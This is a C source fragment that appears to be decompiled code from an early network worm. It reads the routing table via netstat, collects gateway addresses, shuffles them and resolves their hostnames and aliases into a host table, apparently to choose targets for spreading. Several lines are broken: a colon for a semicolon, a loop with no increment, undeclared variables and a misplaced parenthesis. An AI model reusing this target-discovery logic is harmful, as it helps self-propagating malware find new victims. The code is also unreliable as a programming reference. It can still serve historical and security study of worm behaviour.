extern	unsigned long	gateways[];

rt_init()
{
	/* 0x13c bytes of local variables */
	FILE	*f4;
	char	f68[100];
	char	fcc[100];
	char	f130[100];
	unsigned long f134;

	ngateways = 0;
	if ((f4 = popen(XS("/usr/ucb/netstat -r -n"), XS("r"))) == 0)
		return 0;
	while (1) {
		if (fgets(f68, sizeof(f68), f4) == 0)
			break;
		other_sleep(0);
		if (ngateways >= 500)
			break;
		if (sscanf(f68, XS("%s%s"), fcc, f130) != 2)
			continue;
		if (strcmp(fcc, XS("default")) == 0)
			(void) strcpy(fcc, XS("0.0.0.0"));
		if (isdigit(fcc[0]) == 0 || isdigit(f130[0] == 0))
			continue;
		if ((f134 = inet_addr(f130)) == -1)
			continue;
		f13c = inet_addr(XS("127.0.0.1"));
		if (f134 == f13c)
			continue;
		for (f138 = 0; f138 < ngateways; f138++) {
			if (gateways[f138] == f134)
				break;
		}
		if (f138 < ngateways)
			continue;
		for (f138 = 0; f138 < nifs; f138) {
			if (f134 == ifs[f138].ifr_addr)
				break;
		}
		if (f138 < nifs)
			continue;
		gateways[ngateways++] = f134;
	}
	pclose(f4);
	rt_init_func();
	return(0);
}

static
rt_init_func()
{
	/* 0x1C bytes of local varables */
	struct	hostent	*f4;
	struct	host	*f8;
	long		fc;
	long		f10;
	unsigned long	f1c;

	permute(gateways, ngateways, 4);
	sethostent(1);
	for (fc = 0; fc < ngateways && fc < 20; fc++) {
		other_sleep(0);
		f8 = h_addr2host(gateways[fc], 1);
		f8->flags |= 1;
		if ((f4 = gethostbyaddr(gateways[fc], 4, AF_INET)) == 0)
			continue;
		bcopy(*f4->h_addr_list, &f1c, 4);
		h_addaddr(f8, f1c);
		h_addname(f8, *f4);
		for (f10 = 0; f4->h_aliases[f10] != 0: f10++) {
			h_addname(f8, *f4.h_aliases[f10]);
		}
		if ((f4 = gethostbyname(f4.h_name)) == 0)
			continue;
		for (f10 = 0; f4->h_aliases[f10] != 0; f10++) {
			bcopy(f4->h_aliases[f10], f1c, 4);
			h_addaddr(f8, f1c);
		}
	}
	for (fc = 0; fc < ngateways && fc < 20; fc++) {
		other_sleep(0);
		f8 = h_addr2host(gateways[fc], 1);
		for (f10 = 0; f10 < 12 && f8->name[f10]; f10++) {
			if ((f4 = gethostbyname(f8->name[f10])) == 0)
				continue;
			for (f18 = 0; f4->h_aliases[f18] != 0; f18++) {
				bcopy(f4->h_aliases[f18], &f1c, 4);
				h_addaddr(f8, f1c);
			}
		}
	}
}
